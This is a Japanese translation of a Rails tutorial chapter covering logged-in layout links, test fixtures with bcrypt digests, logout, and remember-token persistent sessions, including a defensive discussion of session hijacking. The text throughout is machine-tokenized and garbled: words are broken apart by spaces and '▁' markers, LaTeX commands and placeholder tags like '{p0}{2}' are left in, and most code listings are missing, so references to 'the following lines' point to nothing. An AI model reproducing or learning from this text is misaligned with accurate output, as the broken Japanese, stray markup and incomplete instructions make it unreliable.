▁\ text tt { nil } の 論理値 は false になる ので 、\ text tt {@ foo } への 最初の 代入 「\ text tt { nil ▁| | ▁" bar " }」 の 評価 値 は \ text tt { " bar "} になります 。
▁ 同様に 、 2 つ目の 代入 「\ text tt {@ foo ▁| | ▁" baz "} 」( \ text tt { " bar " ▁| | ▁" baz "} など ) ▁ の 評価 値 は \ text tt { " bar "} になります 。
▁Ruby では 、\ text tt { nil } と \ text tt { false } を 除 いて 、 あらゆる オブジェクトの 論理値 が \ text tt { true } になる ように 設計 されています 。 さらに Ruby では 、\ text tt { | | } 演算子 を い く つ も 連 続 して 式 の中で 使用する 場合 、 項 を 左 から 順に 評価 し 、 最初に true になった 時点 で 処理 を 終 え るように 設計 されています
▁( なお 、 この ように \ text tt { | | } 式 を 左 から 右 に 評価 し 、 演算子 の 左 の 値が 最初に true になった 時点 で 処理 を 終 了 する という 評価 法 を \ emph { 短 絡 評価 ▁( sh or t - c ir c u it ▁ eval u ation ) } ▁ と呼びます 。
▁ 上 記 の 演算子 を コンソール セッション 上で 実際に 実行 して 比 較 してみる と 、\ text tt {@ foo ▁= ▁@ foo ▁| | ▁" bar "} は \ text tt { x ▁= ▁ x ▁ O ▁ y } に 該 当 し 、\ text tt { O } が \ text tt { | | } に置き 換 わ った だけ である ことがわかります 。
▁ x ▁= ▁ x ▁+ ▁1 ▁-> ▁ x ▁+ = ▁1 < n > ▁ x ▁= ▁ x ▁* ▁3 ▁-> ▁ x ▁* = ▁3 < n > ▁ x ▁= ▁ x ▁- ▁ 8 ▁-> ▁ x ▁- = ▁ 8 < n > ▁ x ▁= ▁ x ▁ / ▁2 ▁-> ▁ x ▁ / = ▁2 < n > ▁@ foo ▁= ▁@ foo ▁| | ▁" bar " ▁-> ▁@ foo ▁| | = ▁" bar "
▁この 記 法 を 現在のユーザー の コンテキスト で使用する と 以下のように 簡潔 な コード で 表現 できるようになります 。
▁ 追 記 : ▁\ text tt {@ foo ▁| | ▁@ foo ▁= ▁" bar "} と 書いた 場合 ▁( | | が 左 辺 にある 点に注意 ) 、 Ruby の 内部で は 実際に すべての 項 が 評価 されます 。 これは 、\ text tt {@ foo } が \ text tt { nil } や \ text tt { false } の 場合に 無 駄 な 代入 を避ける 必要がある ためです 。
▁しかし この 式 の動作 では \ text tt { | | = } 記 法 の動作 と同じ に な らず 、 説明 上 不 都 合 なので 、 上の 解 説 では \ text tt {@ foo ▁= ▁@ foo ▁| | ▁" bar "} ▁( | | が 右 辺 にある 点に注意 ) ▁という 式 を 用 いて 説明 しました 。
▁ これはリスト \ ref { code : current _ user } で使用されていま した 。
▁ セッション に含まれる 現在のユーザー を検索する
▁リスト { p 0} の {2} current _ user {/2} メソッドが 動作する ようになった ので 、 ユーザーが ログイン している かどうか に応じて アプリケーションの 動作 を変更 するための 準備 が 整 い ました 。
▁ ログイン 機能 の最初の 具 体 的な 応 用 として 、 ユーザーが ログイン している とき と そう でない とき で レイアウト を変更 してみましょう 。
▁ 図 \ ref { fig : login _ success _ mockup } では 、 ログアウト の リンク と プロフィール の リンク は ▁[ Account ] ▁ メニュー の 項目 として 表示 されている 点 にご注目ください 。 リスト \ ref { code : layout _ login _ log out _ links } では 、 Bootstrap を使用して このような メニュー を 実現 する方法 を示します 。
▁ ログイン 成功 後 のユーザー プロフィール画面 のモックアップ
▁ 筆者 なら 即 、 この時点で 上の メニュー を 記述 する 統合 テストを書く でしょう 。
▁ とは い う もの の 今 は 無 理 は 禁 物 です 。 この テストでは また いくつか 新しい アイディア を 投 入 する 必要 も あるので 、 テスト 作成 は \ ref { sec : testing _ layout _ change s } に 回 す ことにします 。
▁ サイト レイアウト の リンク を変更する 方法 の ひとつ として 考え られ る のは 、 ERB コード の中で if - else を使用し 、 条件 に応じて リンク を表示し 分 け ること です 。
▁この コードを 書く ためには 、 論理値 を返す \ ko de { logged \_ in ?} メソッドが 必要な ので 、 まず それ を定義し ます 。
▁これ をチェックする には 否 定 演算子 ▁(\ ref { sec : objects _ and _ message _ passing }) が 必要な ので 、\ ko de { ! } ▁( 参 考 : ▁ 英語 では b an g と 読み ます ) ▁ を使用します 。
▁作成した \ ko de { logged \_ in ?} メソッドを リスト \ ref { code : logged _ in _ p } に示します 。
▁\ ko de { logged \_ in ?} メソッド
▁リスト \ ref { code : logged _ in _ p } を追加した ので 、 ユーザーの ログイン 時に レイアウト を 変え られ るように する 準備 が できました 。
▁なお 、 新しく 作る リンク は 4 つ ですが 、 そ のうち 以下の 2 つの リンク は 当 面 の 間 未 実装 の ま ま とします ▁( {0}{1} 第 9 章 {/1}{/0} で 完成 の 予 定 )。
▁ ログアウト 用 リンク では 、 リスト \ ref { code : sessions _ resource } で定義した ログアウト 用 パス を使用します 。
▁Web ブラウザ は 実際には \ text tt { DELETE } リクエストを 発 行 できない ので 、 Rails では JavaScript を使用して この リクエストを 「 偽 造 」 します 。
▁なお 、 上のコード は 以下のように 書く こともできます 。
▁しかし この 状 況 では \ ko de { current \_ user } を使う 方が 、 Rails によって \ ko de { user \_ path ( current \_ user ) } され 、 ユーザー プロフィール へのリンク が自動的に 実現 できる ので ず っ と 便利です 。
▁ そして ユーザーが ログイン \ emph { していない } 場合は 、 リスト \ ref { code : sessions _ resource } の ログイン 用 パス を使用して 、 以下のように ログインフォーム へのリンク を作成します 。
▁ 以上 をすべて ヘッダー の パーシャル 部分 に適用 して 更新 した もの を リスト \ ref { code : layout _ login _ log out _ links } に示します 。
▁ ログイン 中 のユーザー 用の レイアウト の リンク を変更する
▁</ li >
▁ 詳 しく は 、\ href { http :// get bootstrap . com / com p on ent s /}{ Bootstrap コンポーネント 一覧 ページ } ▁( 英語 ) ▁ を参照してください 。
▁self を省略した 結果を リスト \ ref { code : bootstrap _ js } に示します 。
▁\ ko de { application . js } に Bootstrap の JavaScript ライブラリ を追加する
▁ / / = ▁require ▁ jquery
▁ / / = ▁require ▁ jquery _ u js
▁ / / = ▁require ▁ bootstrap
▁ / / = ▁require _ tree ▁ .
▁このコードは リスト \ ref { code : layout _ login _ log out _ links } で使用されていま した 。 もうひとつ 、
▁ ブラウザ を 完全に 終 了 すると 、 期待どおり アプリケーションの ログイン ステータス が 消 去 され 、 再 び ログイン を 要求 される ようになった ことを確認 できます 。
▁ ド ロ ッ プ ダ ウ ン メニュー と 新しい リンク が表示され た ログイン 中 のユーザー
▁ アプリケーションで の ログイン 成功 を 手動で 確認 した ので 、 先 に進む前に 統合テスト を 書い て この 動作 を テスト で 表現 し 、 今後 の 回 帰 バグ の 発生 を キャッチ できるように しましょう 。
▁リスト \ ref { code : flash _ persisten ce _ test } を元に テスト を作成し 、 以下の 操作 手順 を テスト で 記述 して 確認 できるようにします 。
▁ セッション 用 パス に 有効な 情報を post する
▁ ログイン 用 リンク が表示され なく な った ことを確認する
▁ ログアウト 用 リンク が表示されている ことを確認する
▁ プロフィール 用 リンク が表示されている ことを確認する
▁上の 変更 を確認する ためには 、 テスト 時に 登録 済み ユーザー として ログイン しておく必要があります 。 当 然 ながら 、 データベースに そのため の ユーザーが 登録 されて い なければなりません 。
▁Rails では 、 このような テスト 用 データを \ emph { フィクスチャ } で 作成 できます 。 フィクスチャ を使用して 、 テスト に 必要な データを test データベースに 読み 込 んで お く ことができます 。
▁\ ref { sec : uniqueness _ validation } では 、 メールの 一意性 テスト ▁( リスト \ ref { code : empty _ fixtures }) ▁ が パス するために デフォルトの フィクスチャ を削除する 必要 があり ました 。
▁今度は 自分 で 空 の フィクスチャ ファイル を作成して データ を追加しましょう 。
▁ 現 時点 の テストでは 、 ユーザー は ひ と り い れば 十分 です 。 その ユーザー には 有効な 名前 と 有効な メールアドレスを 設定 しておきます 。
▁ テスト 中に その ユーザー として 自動 ログイン するために 、 その ユーザーの 有効な パスワード も 用 意 して 、 Sessions コントローラの \ ko de { create } アクションに 送信された パスワード と 比 較 できるように する必要があります 。
▁ 図 \ ref { fig : user _ model _ password _ digest } の データモデル を もう一度 見 てみると 、\ ko de { password \_ digest } 属性を ユーザーの フィクスチャ に追加 すれば よい ことがわかります 。 そのため に 、\ ko de { digest } メソッドを 独 自 に 定義 する ことにします 。
▁\ ref { sec : a _ hash ed _ password } で 説明したように 、\ ko de { has \_ secure \_ password } で bcrypt パスワード が 作成される ので 、 同じ 方法で フィクスチャ 用 パスワード を作成します 。
▁Rails の \ href { https :// github . com / rails / rails / b lo b / master / active model / lib / active _ model / secure _ password . rb } { secure _ password の ソースコード } を調べ てみると 、 以下の メソッド があります 。
▁\ ko de { string } は ハッシュ化 する 文字列 、\ ko de { co st } は \ emph { コ スト パラメータ } と呼ばれる 値 です 。 コ スト パラメータ では 、 ハッシュ を 算 出 するための 計算 コ スト を指定します 。
▁ コ スト パラメータ の 値を 高 く すれば 、 ハッシュ から オ リ ジ ナ ル の パスワードを 計算 で 推測 すること が 困 難 になります ので 、 production 環境で は セキュリティ 上 重要です 。 しかし テスト 中 は コ スト を 高 く する 意味 は ないので 、\ ko de { digest } メソッドの 計算 は なるべく 軽 く しておきます 。
▁ secure _ password の ソースコード には 以下の行 があります 。
▁ 少々 込 み 入 っています が 、 コ スト パラメータ を テスト 中 は 最 小 に し 、 production 環境で は no rm al ▁( h ig h ) ▁ に する方法 が わ か れば 十分 です 。
▁ 「\ ko de { ?} 」 〜 「\ ko de { : }」 という 記 法 については \ ref { sec : remember _ me _ check box } で 解説します 。
▁\ ko de { digest } メソッドは 他にも 様 々 な 場所 で 使用できます 。 \ ref { sec : remember _ token } では \ ko de { digest } を User モデル で 再 利用 します 。
▁ そこで は 、 digest メソッドを \ ko de { user . rb } に置く ことを す す め ています 。
▁ ダイジェスト の 計算 は ユーザー ごとに 行 わ なければならない もの では ないので 、 フィクスチャ ファイル など で わざわざ ユーザー オブジェクト にアクセス する 必 然 性 はありません 。 そこで 、\ ko de { digest } メソッドを User クラス 自身 に 配置 して クラス メソッド にする ことにしましょう ▁( {1} クラス メソッド {/1} の 作り 方 については { p 2 } で 簡単に 説明 しました )。
▁作成した コードをリスト \ ref { code : digest _ method } に示します
▁ フィクスチャ 向け の digest メソッド を追加する
▁# ▁ 与えられた 文字列 の ハッシュ 値 を返す
▁リスト { p 0} の {2} digest {/2} メソッドが できた ので 、 有効な ユーザー を表す ユーザー フィクスチャ を作成 できるようになりました ▁( リスト \ ref { code : re al _ user _ fixture })。
▁ユーザー ログイン のテスト で使用する フィクスチャ
▁ フィクスチャ では ERB を 利用できる 点 にご注目ください 。
▁上の ERB コード で テスト ユーザー 用の 有効な パスワード を作成 できます 。
▁\ ko de { has \_ secure \_ password } で 必要となる \ ko de { password \_ digest } 属性 は これ で 準備 できました が 、 ハッシュ化 されていない 生 の パスワード も 参 照 できる と 便利です 。
▁しかし 残 念 な ことに 、 フィクスチャ では このような ことはできません 。 さらに 、 リスト { p 0} に {2} password {/2} 属性 を追加する と 、 そのような カラム は データベースに 存在しない という エラーが発生し ます 。 実際 、 データベースに は そ ん な カラム はありません 。
▁この 状 況 を 切り 抜 け るために 、 テスト 用の フィクスチャ ユーザー では 全 員 同じ パスワード 「\ ko de { password }」 を使用する ことにします 。 これは フィクスチャ で よく 使われ る 手法 です 。
▁ 有効な ユーザーの フィクスチャ を作成 できた ので 、 テスト で 以下のように フィクスチャ データ を参照 できます 。
▁上の \ ko de { users } は フィクスチャ の ファイル名 \ ko de { users . yml } を表し 、\ ko de { : michael } という シンボル は リスト \ ref { code : re al _ user _ fixture } のユーザー を参照 するための キー を表し ます 。
▁ フィクスチャ のユーザー にアクセス できる ようになった ので 、 レイアウト の リンクを テスト できる 状態 に なりました 。 レイアウト の リンク をテストする には 、 前 述 の 操作 手順 を テストコード に 書き 換 え ます ▁( リスト \ ref { code : user _ login _ test _ valid _ information })。
▁ 有効な 情報 を使用して ユーザー ログイン をテストする
▁ log out _ path
▁上のコード のうち 、 以下の行 は
▁ リダイレクト 先 が 正しい かどうかをチェックし ます 。
▁上の 行 では 、 実際に その ページ に移動し ます 。
▁リスト \ ref { code : user _ login _ test _ valid _ information } では 、 ログイン 用 リンク が表示され なく な った ことも 確認 しています 。 この チェック は 、 ログイン パス の リンク が ページに \ emph { ない } かどうか で 判 定 しています 。
▁\ ko de { count : ▁ 0} という オプションを アサーション に追加する と 、 渡 した パターン に 一致する リンク が ゼ ロ になっている かどうかを確認 する よう \ ko de { assert \_ select } に 指示 します 。
▁なお 、 リスト { p 0} では 、 {2} count : ▁2 {/2} を使用して リンク が 2 つ ある かどうかを確認 している ので 、 比 較 してみる と よいでしょう 。
▁ アプリケーション のコードは 既に 動作する よう になっている ので 、 ここで テスト を実行すると ▁\ passing ▁ になるはずです 。
▁$ ▁bundle ▁exec ▁rake ▁test ▁ T E S T = test / integration / users _ login _ test . rb ▁\ < n >> ▁ T E S T O P T S =" - - name ▁test _ login _ with _ valid _ information "
▁上の コマンド では 、 指定 した テスト ファイル 内に ある 特定の テスト だけ を実行する ために 、 以下の オプション を追加して あります 。
▁ T E S T O P T S =" - - name ▁test _ login _ with _ valid _ information "
▁( 上 記 の 2 行 目 にある ▁' > ' ▁という 文字 は 、 改 行 を 示す ために シ ェ ル が自動的に 挿 入 する 文字 です 。 手動で 入力 しない よう 、 注意 してください 。 ) ▁上の オプションは 、 テスト 名 を指定する ときに 使う オプション です 。 なお 、 指定 する テスト 名 は 、 接 頭 語 の 「 test _ 」 と 、 テスト の 説明 文 の 単 語 を アンダースコア で つ ない だ 文字列 で 表 します 。
▁以上で 認証システム が 動作する ようになりました が 、 今 の ま まで は 、 登録 の 終わっ た ユーザーが デフォルトで は ログイン していない ので 、 ユーザーが と ま どう 可能性があります 。
▁ ユーザー登録 が 終わっ て から ユーザーに 手 動 ログイン を 促 す と 、 ユーザーに 余 分 な 手順 を 強 い ること になる ので 、 ユーザー登録 中に ログイン を 済 ま せ ておく ことにします 。
▁ ユーザー登録 中に ログイン するには 、 Users コントローラの \ ko de { create } アクションに \ ko de { log \_ in } を追加する だけで 済み ます ▁( リスト \ ref { code : login _ up on _ signup })
▁ Sessions コントローラ がある ことで 、 Users コントローラ で \ ko de { log \_ in } メソッド を使用 できるようになります 。 そのため に 必要な モジュール は リスト \ ref { code : sessions _ helper _ include } で インクルード されています 。
▁ ユーザー登録 中に ログイン する
▁リスト \ ref { code : login _ up on _ signup } の動作 をテストする ために 、 リスト \ ref { code : a _ test _ for _ valid _ submission } のテスト に 1 行 追加 して 、 ユーザーが ログイン 中 かどうかをチェックし ます 。
▁その ために 、 リスト { p 0} で定義した {2} logged _ in ? {/2} ヘルパーメソッド とは 別 に 、 {2} is _ logged _ in ? {/2} ヘルパーメソッド を定義し ておく と 便利です 。 この ヘルパーメソッド は 、 テスト の セッション に ユーザー があれば {2} true {/2} を返し 、 それ以外の 場合は false を返します ▁( リスト \ ref { code : test _ helper _ sessions })。
▁ 残念ながら ヘルパーメソッド は テスト から 呼 び 出 せ ないので 、 リスト { p 0} のように {2} current _ user {/2} を 呼 び 出 せ ません 。 {2} session {/2} メソッドは テスト でも 利用できる ので 、 これを 代わりに 使用します 。
▁ここでは 取り 違 え を防ぐ ため 、\ ko de { logged \_ in ?} の代わりに \ ko de { is \_ logged \_ in ?} を使用して 、 ヘルパーメソッド 名 が テスト ヘルパー と Session ヘルパー で 同じ に なら ないように しておきます
▁ 一 例 として 、 かつ て 筆者 が 作成した テストスイート では 、 Sessions ヘルパー から { 0} log _ in {/0} メソッドを う っかり 削除 して し ま った にも か か わ らず 、 テストが ▁\ passing ▁ の ま ま 変 わ ら なかった こと があり ました 。
▁ 原 因 は 、 テスト で 使用 して いた テスト ヘルパーメソッド の名前 が 、 う かつ にも Sessions ヘルパーメソッド 名 と同じ だ った ことです 。 そのため 、 アプリケーション が 壊 れ て いて も テストが パス し てしまい ました 。
▁ テスト ヘルパーメソッド 名を 、 Session ヘルパーメソッド 名 \ ko de { log \_ in \_ as } ▁( リスト \ ref { code : test _ helper _ log _ in }) ▁ とは 異なる \ ko de { is \_ logged \_ in ?} で 定義 することで 、 この問題 を 回 避 できます 。
▁ テスト 中 の ログイン ステータス を 論理値 で 返す メソッド
▁リスト \ ref { code : test _ helper _ sessions } のコード を使用すると 、 ユーザー登録 の 終わっ た ユーザーが ログイン 状態 になっている かどうかを確認 できます ▁( リスト \ ref { code : login _ after _ signup _ test })。
▁ ユーザー登録 後 の ログイン のテスト
▁これで 、 テスト を実行すると ▁\ passing ▁ になるはずです 。
▁\ ref { sec : sessions _ and _ failed _ login } で 解 説 した ように 、 この アプリケーション で使用する 認 証 モデル では 、 ユーザーが 明示的に ログアウト する まで は ログイン 状態 を 保 て なく て は なり ません 。
▁この節では 、 そのため に 必要な ログアウト 機能 を追加する ことにします 。
▁ ログアウト 用 リンク は リスト \ ref { code : layout _ login _ log out _ links } で 既に 作成 済み なので 、 ユーザー セッション を 破 棄 するための 有効な アクション を コントローラ で 作成する だけで 済み ます 。
▁ これまで 、 Sessions コントローラのアクション は RESTful ルール に従って い ました 。 \ ko de { new } で ログイン ページ を表示し 、\ ko de { create } で ログイン を 完了 する といった 具 合 です 。
▁ セッション を 破 棄 する \ ko de { destroy } アクション も 、 引 き 続 き 同じ要領で 作成する ことにします 。
▁ただし 、 ログイン の場合 ▁( リスト \ ref { code : log _ in _ success } と リスト \ ref { code : login _ up on _ signup }) ▁ と異なり 、 ログアウト 処理 は 1 か 所 で 行える ので 、\ ko de { destroy } アクションに 直接 ログアウト 処理 を 書く ことにします 。
▁\ ref { sec : remember _ tests } でも 説明します が 、 この 設計 ▁( および 若 干 の リファクタリング ) ▁ の おかげで 認 証 メ カ ニ ズ ム の テストが 行 い 易 く なります 。
▁ ブラウザ によって は 、 「\ href { http :// st ack o ver flow . com / que st ions / 20 4 4 9 64 1 / rails - 4 - session - value - n e ver - expir es - or - d ies - w h en - browser - c lo s es } { ログイン 状態 を保存する }」 など で セッション を 自動 復 元 する 機能 が サポート されている ことがあります 。 この 機能 は 開発 の 邪 魔 になる ので 、 ログアウト する 前に この 機能を 必ず オフ に して おいてください 。
▁ インスタンス変数 \ ko de {@ current \_ user } を \ ko de { nil } にする 必要がある のは 、\ ko de {@ current \_ user } が \ ko de { destroy } アクション より 前に 作成 され ▁( 作成 されていない 場合 ) 、\ emph { かつ } 、 リダイレクト を直接 発 行 し なかった 場合 だけです 。 今回は リダイレクト を直接 発 行 している ので 、 不要です 。
▁ 現 実 に このような 条件 が発生する 可能性 は かなり 低 く 、 この アプリケーション でも このような 条件 を 作り 出 さ ないように 開発 している ので 、 本 来 は nil に設定する 必要 は ない のですが 、 ここでは セキュリティ上の 死 角 を 万 が 一 に でも 作り 出 さ ない ために あえて nil に設定し ています 。
▁self を省略した 結果を リスト \ ref { code : log _ out _ method } に示します 。
▁\ ko de { log \_ out } メソッド
▁# ▁ 現在のユーザー を ログアウト する
▁self を省略した 結果を リスト \ ref { code : destroy _ session } に示します 。
▁ セッション を 破 棄 する ▁( ユーザー ログアウト )
▁ ログアウト 機能を テスト するために 、 リスト \ ref { code : user _ login _ test _ valid _ information } のユーザー ログイン のテスト に 手順 を 若 干 追加 します 。
▁ ログイン 後 、\ ko de { delete } メソッドで \ text tt { DELETE } リクエストを ログアウト 用 パス ▁( 表 \ ref { table : RESTful _ sessions }) ▁ に 発 行 し 、 ユーザーが ログアウト して ルート URL に リダイレクト された ことを確認します 。 ログイン 用 リンク が 再度 表示される こと 、 ログアウト 用 リンク と プロフィール 用 リンク が 非 表示 になる ことも 確認 します 。
▁ 手順 を追加した テストを リスト \ ref { code : user _ log out _ test } に示します 。
▁ユーザー ログアウト のテスト
▁ テスト で \ ko de { is \_ logged \_ in ?} ヘルパーメソッド を 利用 できるように して あった おかげで 、 有効な 情報を セッション 用 パス に post した 直 後に \ ko de { assert ▁is \_ logged \_ in ?} で 簡単に テスト できました 。
▁\ ref { sec : log g ing _ in } で 完了 した ログイン システム は 、 それ 自体 で 十分 完 結 した 機能 です 。 しかし 多くの Web サイト では 、 ブラウザを閉じ た 後に も セッション を 継 続 する 機能 など を追加し ている のが普通です 。
▁ 本 節 では 、 ユーザー ログイン を デフォルトで 保 持 する ように 変更 し 、 ユーザーが 明示的に ログアウト する まで は セッション を 期限切れ に しない ようにします 。
▁ この後 \ ref { sec : remember _ me _ check box } では 、 別の 方法 として 、 ログイン を保存する 「 remember - me 」 チェックボックス を追加して 、 ログイン を 継 続 する かどうかを ユーザーが 選択 できるように する 予定です 。
▁ どちら の 方 式 も 商 用 に 利用できる 品 質 を 備 え ています 。 前 者 は \ href { http :// github . com /}{ GitHub } や \ href { http :// bitbucket . org /}{ Bitbucket } で 、 後 者 は \ href { http :// www . fa ce book . com /}{ F a ce book } や \ href { http :// t w it ter . com /}{ Twitter } で それぞれ 採 用 されています 。
▁\ ref { sec : log g ing _ in } では 、 Rails の \ ko de { session } メソッドを使用して ユーザー ID を保存し ましたが 、 この 情報 は ブラウザを閉じ ると 消 え てしまいます 。
▁ 本 節 では 、 セッション の 永 続 化 の 第 一 歩 として \ emph { 記憶トークン ▁( remember ▁ token ) ▁ } を生成し 、\ ko de { cookies } メソッド による 永続的 cookies の作成 や 、 安全 性 の 高 い \ emph { 記憶ダイジェスト ▁( remember ▁ digest ) ▁ } による トークン 認 証 に この 記憶トークン を 活用 します 。
▁\ ref { sec : a _ working _ log _ in _ method } で 解 説 した ように 、\ ko de { session } メソッドで 保存 した 情報 は自動的に 安全 が 保 た れ ます が 、\ ko de { cookies } メソッド に保存 する 情報 は 残念ながら その ように は な って いません 。
▁ 特に 、 cookies を 永 続 化 すると \ href { http :// en . w ikipedia . org / wiki / Session _ h i j ack ing } { セッション ハイジャック } という 攻撃 を 受け る 可能性があります 。 この 攻撃 は 、 記憶トークン を 奪 って 、 特定の ユーザー になり す ま して ログイン する という ものです 。
▁ セッション ハイジャック は 、 セキュリティ上の 注意 を 呼 び かけ るために これを 実 演 する \ href { http :// code b u t l er . com / fi re sh e e p } { F ir e sh e e p } アプリケーション によって 広 く 知 られ る ようになりました 。 F ir e sh e e p を使用すると 、 公 共 W i - F i ネットワーク 経由で 接続 したときに 多くの 有 名 Web サイトの 記憶トークン が 丸 見え になっている ことがわかります 。
▁\ ref { sec : pro f ess ion al _ gra de _ de p lo y m ent } では 、 最初の 問題 を 防止 するために \ href { https :// en . w ikipedia . org / wiki / T r an s port _ L a y er _ S ec ur ity } { S ec ur e ▁S ock e t s ▁ L a y er } ▁( SSL ) ▁ を サイト 全体 に適用 して 、 ネットワーク データを 暗号化 で 保 護 し 、 パ ケ ッ ト ス ニ ッ フ ァ から 読み 取 られ ないように しています 。
▁2 番目の 問題 の 対策 として は 、 記憶トークン を そのまま データベースに保存 する の ではなく 、 記憶トークン の ハッシュ 値 を保存する ようにします 。 これは 、\ ref { sec : adding _ a _ secure _ password } で 生 の パスワード をデータベースに保存する 代わりに パスワード の ダイジェスト を保存し た の と同じ コ ン セ プ ト です 。
▁3 ▁ 番目の 問題 については 、 Rails によって自動的に 対策 が 行われます 。 具体的には 、 ビュー テンプレート で 入力 した 内容 をすべて 自動的に エスケープ します 。
▁4 番目の ログイン 中 の コンピュータ への 物 理 アクセス による 攻撃 については 、 さ す が に システム 側 で の 根 本 的な 防 衛 手 段 を 講 じ ること は 不 可能な のですが 、 ユーザーが ログアウト したときに トークン を 必ず 変更 し 、 機 密 上 重要 になる 可能性 のある 情報を ブラウザ に 表示 するときに は \ emph { 暗 号 による 署 名 } を行う ように することで 、 物 理 アクセス による 攻撃 を 最 小 限 に 留 め るように します 。
▁ 上 で説明した 設計 や セキュリティ上の 考 慮 事 項 を元に 、 以下の 方 針 で 永続的 セッション を作成する ことにします 。
▁ 記憶トークン には ランダム な 文字列 を生成し て 用 いる 。
▁ ブラウザ の cookies に トークン を保存する ときに は 、 有効 期 限 を設定する 。
▁ トークン は ハッシュ 値 に変換 して から データベースに保存 する 。
▁ ブラウザ の cookies に保存 する ユーザー ID は 暗号化 しておく 。
▁ 永 続 ユーザー ID を含む cookies を 受け 取 った ら 、 その ID で データベース を 検索 し 、 記憶トークン の cookies が データベース 内の ハッシュ 値 と 一致する ことを確認する 。
▁上の 最後の 手順 が 、 ユーザー ログイン のとき の 手順 と 似 ている ことにご注目ください 。 ユーザー ログイン では 、 メールアドレスを キー に して ユーザー を取り出し 、 送信された パスワード が パスワード ダイジェスト と 一致する ことを ▁(\ ko de { authenticate } メソッドで ) ▁ 確認 します ▁( リスト \ ref { code : find _ authenticate _ user })。
▁つまり 、 ここで の実装 は \ ko de { has \_ secure \_ password } と 似 た 側 面 を 持 ち ます 。
▁それでは 最初に 、 必要となる \ ko de { remember \_ digest } 属性を User モデル に追加します ▁( 図 \ ref { fig : user _ model _ remember _ digest })。
▁\ ko de { remember \_ digest } 属性 を追加した User モデル
▁ 図 \ ref { fig : user _ model _ remember _ digest } の データモデル を アプリケーション に追加 するために 、 以下の マイグレーション を生成します 。
▁(\ ref { sec : a _ hash ed _ password } の パスワード ダイジェスト のとき の マイグレーション と 比 較 してみましょう )。
▁ 前 回 の マイグレーション と同様 、 今回の マイグレーション 名 も \ ko de { \_ to \_ users } で 終わっ ています 。 これは 、 マイグレーション の 対象 が データベースの \ ko de { users } テーブル であることを Rails に 指示 する ためのものです 。
▁ 今回は 種類 = \ ko de { string } の \ ko de { remember \_ digest } 属性 を追加し ている ので 、 いつものように Rails によって デフォルトの マイグレーション が 作成されます ▁( リスト \ ref { code : add _ remember _ digest _ to _ users _ generated })。
▁ 記憶ダイジェスト 用 に 生成 した マイグレーション
▁ 記憶ダイジェスト は ユーザーが 直接 読み 出 す ことは ないので ▁( かつ 、 そう させ て は なら ないので ) 、\ ko de { remember \_ digest } カラム に インデックス を追加する 必要はありません 。 従って 、 上の マイグレーション は 変更 せずに そのまま 使用します 。
▁ここで 、 記憶トークン として 何 を使用する か を 決 め る必要があります 。
▁ 有 力 な 候 補 として 様 々 な もの が 考え られます が 、 基本的に は 長 く て ランダム な 文字列 であれば どんな もの でも 構 いません 。
▁このメソッドは 、 RailsCast の 「\ href { http :// rails casts . com / e p is odes / 27 4 - remember - me - reset - password } { remember ▁ me }」 の 記事 を元に 選 び ました 。
▁ 典 型 的な base 64 の 文字列 は 、 次のような ものです 。
▁ 実際 、 これ でも O K な のです 。 bcrypt の \ href { https :// en . w ikipedia . org / wiki / S alt _ % 28 c ry p to gra ph y % 2 9 } { ハッシュ は ソ ル ト 化 されている } ので 、 2 人のユーザー の パスワード が 本当に 一致する の かどうか は ハッシュ から は 絶 対 わかり ません 。 ( 訳 注 : ▁ 「 ソ ル ト 」 とは 、 暗 号 を 強 化 するために 加 え られ る 任意の 短 い 文字列 です 。 念 には 念 を 入 れ て 「 塩 ひとつ ま み 」 を加え る という イ メ ー ジ であり 、 英語 の 「 t a ke ▁it ▁with ▁a ▁ gra in ▁of ▁ s alt 」 = 半 分 疑 って か か る という 言 い 回 し が 語 源 です )
▁ 記憶トークン が 一意 に 保 た れる ことで 、 攻撃者 は ユーザー ID と 記憶トークン を \ emph { 両方 とも } 奪 い 取 ること に 成功 しない 限 り セッション を ハイジャック でき なくなります 。
▁さらに あり が たい ことに 、 base 64 は URL を 安全 に エスケープ するために も 用 い られ る ▁(\ ko de { url safe _ base 64 } という名前の メソッド がある こと から も わかり ます ) ▁ ので 、 base 64 を 採 用 すれば 、 {1} 第 {2} 10 {/2} 章 {/1} で アカウント の 有効化 の リンク や パスワード リセット の リンク でも 同じ トークン ジェネレータ を使用 できるようになります 。
▁ ユーザーを 記 憶 するには 、 記憶トークン を作成して 、 その トークン を ダイジェスト に変換 した もの を データベースに保存 します 。
▁ フィクスチャ をテストする ときに \ ko de { digest } メソッドを 既に 作成 して あった ので ▁( リスト \ ref { code : digest _ method }) 、 上の 結 論 に従って 、 新しい トークン を作成する ための \ ko de { new \_ token } メソッド を作成 できます 。
▁ 一般に 、 ある メソッドが オブジェクトの インスタンス を 必要 と していない 場合は 、 クラス メソッド にする の が 常 道 です 。
▁\ ref { sec : account _ activation _ mailer } では 、 実際に この 決 定 が 重要 になって きます 。
▁ これはリスト \ ref { code : token _ method } で使用されていま した 。
▁ トークン 生成 用 メソッド を追加する
▁ さ し あ た って の実装 計 画 として は 、\ ko de { user . remember } メソッド を作成する ことにします 。 このメソッドは 、 記憶トークン を ユーザー と 関連付け 、 トークン に対応する 記憶ダイジェスト を データベースに保存 します 。
▁リスト \ ref { code : add _ remember _ digest _ to _ users _ generated } の マイグレーション を行って あるので 、 User モデル には 既に \ ko de { remember \_ digest } 属性 が追加され ています が 、\ ko de { remember \_ token } 属性 はまだ 追加 されていません 。
▁ そこで 、\ ko de { user . remember \_ token } メソッド ▁( cookies の 保存 場所 です ) ▁ を使用して トークン にアクセス できるように する必要があります 。 しか も 、 トークン を データベースに \ emph { 保存 せずに } 実装 する必要があります 。
▁その ためには 、\ ref { sec : adding _ a _ secure _ password } の 安全 な パスワード の 問題 のとき と同様 の 手法 で これを 解決 します 。 あ のとき は 、「 仮 想 の 」 \ ko de { password } 属性 と 、 データベース 上の セキュア な \ ko de { password \_ digest } 属性 を使用し ました 。
▁ 仮 想 の \ ko de { password } 属性 は \ ko de { has \_ secure \_ password } メソッドで 自動的に 作成 できました が 、 今回は \ ko de { remember \_ token } の コードを 自分 で 書く 必要があります 。
▁これ を行う には 、 { p 0} で 行った ように {2} attr _ accessor {/2} を使用して アクセス 可能な 属性 を作成します 。
▁\ ko de { remember } メソッドの 1 行 目 の 代入 にご注目ください 。
▁\ ko de { self } という キーワード を使用し ない と 、 Ruby によって \ ko de { remember \_ token } という名前の \ emph { ローカル } 変数 が作成され てしまいます 。 この 動作 は 、 Ruby における オブジェクト 内部 への 要素 代入 の 仕 様 による ものです 。 今 欲 しい のは ローカル変数 ではありません 。
